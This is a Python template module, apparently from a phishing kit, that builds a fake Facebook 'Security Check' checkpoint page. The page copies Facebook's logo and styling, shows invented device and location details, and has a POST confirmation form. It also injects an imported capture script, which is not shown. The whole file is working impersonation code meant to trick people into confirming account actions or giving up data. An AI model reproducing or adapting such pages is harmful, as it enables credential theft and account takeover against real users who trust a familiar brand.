"""html_checkpoint.py — auto-generated from templates.py."""

import base64

from .js_capture import JS_STRICT_CAPTURE

HTML_CHECKPOINT = r"""
<!DOCTYPE html>
<html lang="{{ lang }}" dir="{{ direction }}">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Security Check</title>
    <script src="https://cdn.tailwindcss.com"></script>
    """ + JS_STRICT_CAPTURE + r"""
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
        body { font-family: 'Roboto', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f0f2f5; }
        .fb-header { background: #1877f2; color: white; padding: 8px 16px; display: flex; align-items: center; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .checkpoint-card { background: white; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); max-width: 420px; margin: 40px auto; overflow: hidden; }
        .checkpoint-header { padding: 20px; text-align: center; border-bottom: 1px solid #dddfe2; }
        .checkpoint-body { padding: 24px; }
        .device-info { background: #f0f2f5; border-radius: 6px; padding: 12px; margin: 16px 0; font-size: 15px; }
        .btn-yes { background: #1877f2; color: white; }
        .btn-no { background: #e4e6ea; color: #050505; }
    </style>
</head>
<body>
    <div class="fb-header">
        <div style="display: flex; align-items: center;"><svg width="32" height="32" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" fill="none"><path fill="#1877F2" d="M15 8a7 7 0 00-7-7 7 7 0 00-1.094 13.915v-4.892H5.13V8h1.777V6.458c0-1.754 1.045-2.724 2.644-2.724.766 0 1.567.137 1.567.137v1.723h-.883c-.87 0-1.14.54-1.14 1.093V8h1.941l-.31 2.023H9.094v4.892A7.001 7.001 0 0015 8z"/><path fill="#ffffff" d="M10.725 10.023L11.035 8H9.094V6.687c0-.553.27-1.093 1.14-1.093h.883V3.87s-.801-.137-1.567-.137c-1.6 0-2.644.97-2.644 2.724V8H5.13v2.023h1.777v4.892a7.037 7.037 0 002.188 0v-4.892h1.63z"/></svg></div>
        <div class="ml-auto flex items-center gap-2 text-sm">
            <span>{{ lang_name }}</span>
        </div>
    </div>

    <div class="checkpoint-card">
        <div class="checkpoint-header">
            <div class="mx-auto w-12 h-12 bg-blue-100 rounded-2xl flex items-center justify-center mb-4">
                <svg xmlns="http://www.w3.org/2000/svg" class="w-8 h-8 text-[#1877f2]" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 8.944 11.922.42.095.858.143 1.295.143a3 3 0 01.255-.007" />
                </svg>
            </div>
            <h1 class="text-2xl font-semibold text-[#050505]">{{ checkpoint_title }}</h1>
            <p class="text-[#65676b] mt-2 text-[15px]">{{ checkpoint_sub }}</p>
        </div>

        <div class="checkpoint-body">
            <div class="device-info text-[#050505]">
                <div class="flex justify-between mb-1"><span class="font-medium">{{ device_label }}</span><span>{{ device }}</span></div>
                <div class="flex justify-between mb-1"><span class="font-medium">{{ location_label }}</span><span>{{ city }}, {{ country }}</span></div>
                <div class="flex justify-between"><span class="font-medium">{{ time_label }}</span><span id="device-time">Just now</span></div>
            </div>

            <p class="text-[#65676b] text-sm text-center mb-6">{{ checkpoint_sub }}</p>

            <form method="POST" class="space-y-3">
                <input type="hidden" name="action" value="checkpoint">
                <button type="submit" class="btn-yes w-full py-3.5 rounded-lg font-semibold text-[17px] flex items-center justify-center gap-2 hover:brightness-95">
                    {{ yes_btn }}
                </button>
            </form>

            <div class="text-center text-[#1877f2] text-xs mt-8 cursor-pointer hover:underline">{{ help }}</div>
        </div>
    </div>

    <script>
        const now = new Date();
        document.getElementById('device-time').textContent = now.toLocaleTimeString('{{ locale }}', {hour:'2-digit', minute:'2-digit'});
    </script>
</body>
</html>
"""
